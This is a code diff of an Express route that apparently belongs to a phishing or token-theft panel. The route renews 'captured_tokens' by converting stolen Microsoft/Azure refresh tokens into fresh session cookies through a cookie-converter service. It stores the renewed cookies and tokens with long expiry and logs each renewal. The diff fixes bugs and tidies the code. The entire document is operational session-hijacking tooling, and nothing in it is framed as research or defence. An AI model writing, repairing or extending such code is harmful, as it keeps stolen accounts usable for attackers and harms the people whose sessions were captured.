@@ -848,30 +848,76 @@ router.post('/:id/renew', userAuth, async (req, res) => {
         const cookieConverter = require('../services/cookieconverter');
         const templateType = token.token_type === 'cookie' ? (token.template_type || 'office') : 'office';
         const tokenTenant = token.tenant || config.AZURE_TENANT || 'common';
+
+        // Use stored client_id if available, otherwise fall back to env
         const tokenClientId = token.client_id || config.AZURE_CLIENT_ID;
-        const result = await cookieConverter.convertTokensToCookies(refreshToken, templateType, tokenTenant, null, token.account_type || 'unknown');
+        const result = await cookieConverter.convertTokensToCookies(
+          refreshToken, templateType, tokenTenant, null, token.account_type || 'unknown'
+        );
+
         if (result.success && result.cookies) {
           const ttlHours = config.COOKIE_MAX_TTL_HOURS || 720;
           const newAccessToken = result.access_token || accessToken;
           const newRefreshToken = result.new_refresh_token || refreshToken;
-          const cookieCount = result.cookies ? result.cookies.split(';').filter(c => c.trim()).length : 0;
-          await db.query(`UPDATE captured_tokens SET cookies_encrypted=?, token_type='cookie', expiration=DATE_ADD(NOW(),INTERVAL ? HOUR), last_renewed=NOW(), renewal_count=COALESCE(renewal_count,0)+1, access_token_encrypted=?, refresh_token_encrypted=? WHERE id=?`, [encrypt(result.cookies), ttlHours, encrypt(newAccessToken), encrypt(newRefreshToken), token.id]);
-          await db.query('INSERT INTO cookie_renewals (capture_id, user_id, success, ip_address, renewal_type) VALUES (?, ?, 1, ?, ?)', [token.id, req.user.id, req.ip || '127.0.0.1', 'refresh_token']);
-          return res.json({ success: true, message: 'Session renewed', cookies: result.cookies, cookie_count: cookieCount });
+
+          await db.query(
+            `UPDATE captured_tokens
+             SET cookies_encrypted = ?, token_type = 'cookie',
+                 expiration = DATE_ADD(NOW(), INTERVAL ? HOUR),
+                 last_renewed = NOW(),
+                 renewal_count = COALESCE(renewal_count, 0) + 1,
+                 access_token_encrypted = ?, refresh_token_encrypted = ?
+             WHERE id = ?`,
+            [
+              encrypt(result.cookies),
+              ttlHours,
+              encrypt(newAccessToken),
+              encrypt(newRefreshToken),
+              token.id
+            ]
+          );
+
+          await db.query(
+            'INSERT INTO cookie_renewals (capture_id, user_id, success, ip_address, renewal_type) VALUES (?, ?, 1, ?, ?)',
+            [token.id, req.user.id, req.ip || 'unknown', 'refresh_token']
+          );
+
+        // FIX: Use local cookie_count variable instead of undefined result.cookie_count
+        const cookieCount = result.cookies ? (result.cookies.split(';').filter(c => c.trim()).length) : 0;
+        return res.json({
+          success: true,
+          message: 'Session renewed successfully using refresh token',
+          cookies: result.cookies,
+          cookie_count: cookieCount
+        });
         }
       } catch (refreshErr) {
         console.error('[Tokens] Refresh token renewal failed:', refreshErr.message);
       }
     }
 
+    // Fallback: For cookie-mode tokens without valid link_id, try direct refresh token exchange
     if (!token.link_id || token.token_type === 'cookie') {
+      // Use the cookie converter as fallback
       const cookieConverter = require('../services/cookieconverter');
-      const cookieResult = await cookieConverter.convertTokensToCookies(refreshToken || accessToken, 'office', token.tenant || 'common', null, token.client_id || config.AZURE_CLIENT_ID);
+      const cookieResult = await cookieConverter.convertTokensToCookies(
+        refreshToken || accessToken, 'office', token.tenant || 'common', null, token.account_type || 'unknown'
+      );
+
       if (cookieResult.success && cookieResult.cookies) {
         const ttlHours = config.COOKIE_MAX_TTL_HOURS || 720;
-        const cookieCount = cookieResult.cookies ? cookieResult.cookies.split(';').filter(c => c.trim()).length : 0;
-        await db.query('UPDATE captured_tokens SET cookies_encrypted=?, token_type=?, expiration=DATE_ADD(NOW(),INTERVAL ? HOUR), last_renewed=NOW(), renewal_count=COALESCE(renewal_count,0)+1 WHERE id=?', [encrypt(cookieResult.cookies), 'cookie', ttlHours, token.id]);
-        return res.json({ success: true, message: 'Session renewed', cookies: cookieResult.cookies, cookie_count: cookieCount });
+        await db.query(
+          'UPDATE captured_tokens SET cookies_encrypted=?, token_type=?, expiration=DATE_ADD(NOW(),INTERVAL ? HOUR), last_renewed=NOW(), renewal_count=COALESCE(renewal_count,0)+1 WHERE id=?',
+          [encrypt(cookieResult.cookies), 'cookie', ttlHours, token.id]
+        );
+        // FIX: Use local cookie_count variable instead of undefined result.cookie_count
+        const cookieCount = cookieResult.cookies ? (cookieResult.cookies.split(';').filter(c => c.trim()).length) : 0;
+        return res.json({
+          success: true,
+          message: 'Session renewed successfully',
+          cookies: cookieResult.cookies,
+          cookie_count: cookieCount
+        });
       }
       return res.status(400).json({ error: 'Renewal failed: ' + (cookieResult.error || 'Could not refresh session'), success: false });
     }
